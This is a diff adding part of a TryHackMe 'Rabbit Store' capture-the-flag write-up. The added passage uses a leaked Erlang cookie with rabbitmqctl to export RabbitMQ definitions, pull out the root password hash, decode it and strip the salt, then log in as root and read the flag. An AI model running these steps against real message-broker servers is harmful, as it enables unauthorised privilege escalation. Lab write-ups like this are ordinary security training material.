@@ -1045,3 +1045,118 @@ Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1
 
 
 
+```bash
+5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge list_users
+Listing users ...
+user	tags
+The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
+root	[administrator]
+```
+
+Lets crack root user password then
+
+
+
+```bash
+5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge export_definitions /tmp/def.json
+Exporting definitions in JSON to a file at "/tmp/def.json" ...
+5468a1f12f60:/# cat /tmp/def.json | jq
+{
+  "permissions": [
+    {
+      "configure": ".*",
+      "read": ".*",
+      "user": "root",
+      "vhost": "/",
+      "write": ".*"
+    }
+  ],
+  "bindings": [],
+  "queues": [
+    {
+      "arguments": {},
+      "auto_delete": false,
+      "durable": true,
+      "name": "tasks",
+      "type": "classic",
+      "vhost": "/"
+    }
+  ],
+  "policies": [],
+  "parameters": [],
+  "rabbitmq_version": "3.9.13",
+  "exchanges": [],
+  "global_parameters": [
+    {
+      "name": "cluster_name",
+      "value": "rabbit@forge"
+    }
+  ],
+  "rabbit_version": "3.9.13",
+  "topic_permissions": [
+    {
+      "exchange": "",
+      "read": ".*",
+      "user": "root",
+      "vhost": "/",
+      "write": ".*"
+    }
+  ],
+  "users": [
+    {
+      "hashing_algorithm": "rabbit_password_hashing_sha256",
+      "limits": {},
+      "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",
+      "password_hash": "********************/*********************",
+      "tags": []
+    },
+    {
+      "hashing_algorithm": "rabbit_password_hashing_sha256",
+      "limits": {},
+      "name": "root",
+      "password_hash": "****************************/***********************",
+      "tags": [
+        "administrator"
+      ]
+    }
+  ],
+  "vhosts": [
+    {
+      "limits": [],
+      "metadata": {
+        "description": "Default virtual host",
+        "tags": []
+      },
+      "name": "/"
+    }
+  ]
+}
+```
+
+
+We can see root hash. Lets look at the docs to which hashing_algorithm and salting used.
+
+[Credentials and Passwords | RabbitMQ](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)
+
+![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo10.webp){: width="972" height="589" }
+
+
+
+```bash
+❯ echo "****************/*******************" | base64 -d | xxd -p -c 100
+```
+
+
+After removing first 4 bytes now we have the root password.
+
+
+
+
+```bash
+azrael@forge:/usr/local/bin$ su - root
+Password: 
+root@forge:~# ls
+forge_web_service  root.txt  snap
+root@forge:~# cat root.txt 
+*******************************
+```
